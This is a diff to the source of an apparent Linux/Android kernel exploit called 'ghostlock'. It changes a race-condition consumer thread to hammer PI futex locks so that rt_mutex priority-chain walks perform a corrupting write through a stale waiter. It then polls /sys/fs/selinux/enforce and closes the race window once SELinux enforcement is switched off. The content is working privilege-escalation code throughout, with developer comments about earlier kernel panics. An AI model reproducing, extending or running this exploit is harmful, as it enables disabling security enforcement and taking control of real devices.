@@ -7,10 +7,14 @@
 #include "race/threads.hpp"
 
 #include "attack/ops.hpp"
+#include "kernel/runtime_struct_offsets.h"
 #include "profile/model.h"
 #include "route/route_controller.h"
 #include "route/route_policy.hpp"
 #include "session/exploit_session.hpp"
+
+#include <fcntl.h>
+#include <unistd.h>
 
 using namespace ghostlock;
 
@@ -132,19 +136,53 @@ namespace ghostlock::race {
                                             ? (calls_this_seq % 19) + 1
                                             : kernel::PSELECT_CONSUMER_NICE;
                     long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
-                    if (sched_ret != 0) {
-                        struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
-                        long fret = support::futex_op(
-                            &race->target_futex, FUTEX_LOCK_PI, 0, &ft, nullptr, 0);
-                        if (fret == 0) {
-                            support::futex_op(
-                                &race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
-                            sched_ret = 0;
-                        }
+                    errno = 0;
+                    /* E6d: walk the PI futex queues on EVERY call. The old code
+                     * only ran this pair when sched_setattr failed — and on
+                     * katyusha it never fails (calls=4 success=4), so the
+                     * queue-walking path never executed. Blocking on
+                     * target_futex (even to a timeout) enqueues this thread's
+                     * waiter and runs rt_mutex_adjust_prio_chain over the
+                     * owner's PI tree — the reposition/dequeue of the stale
+                     * waiter is what executes its stamped write encoding. */
+                    struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
+                    long fret = support::futex_op(
+                        &race->target_futex, FUTEX_LOCK_PI, 0, &ft, nullptr, 0);
+                    int32_t fret_errno = errno;
+                    if (fret == 0) {
+                        support::futex_op(
+                            &race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
+                    } else if ((calls_this_seq % 4) == 1) {
+                        pr_info("consumer: target LOCK_PI ret=%ld errno=%d (walk)\n",
+                                fret, fret_errno);
                     }
                     if (sched_ret == 0) race->consumer_success.fetch_add(1);
                     race->consumer_inflight.store(0);
                     calls_this_seq++;
+                    /* E2: for the W1 request the erase lands asynchronously
+                     * inside this sched_setattr's PI walk. Poll the flag and
+                     * close the window the moment it flips — a further consume
+                     * would walk the chain again and re-erase the already
+                     * dequeued node (the E1b panic). */
+                    if (race->request &&
+                        race->request->target ==
+                            session::g_exploit_session.addresses.data_alias(
+                                ghostlock::profile::selinux_enforcing())) {
+                        char enforce_state = '1';
+                        int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
+                        if (enforce_fd >= 0) {
+                            char buf[2] = {0, 0};
+                            ssize_t got = read(enforce_fd, buf, 1);
+                            close(enforce_fd);
+                            if (got == 1) enforce_state = buf[0];
+                        }
+                        if (enforce_state == '0') {
+                            pr_info("consumer: enforce flipped to 0 after %d calls; closing window\n",
+                                    calls_this_seq);
+                            race->consumer_go.store(0);
+                            break;
+                        }
+                    }
                     if (static_cast<uint32_t>(calls_this_seq) >=
                         session::g_exploit_session.profile.select_consumer_max_calls()) {
                         race->consumer_go.store(0);
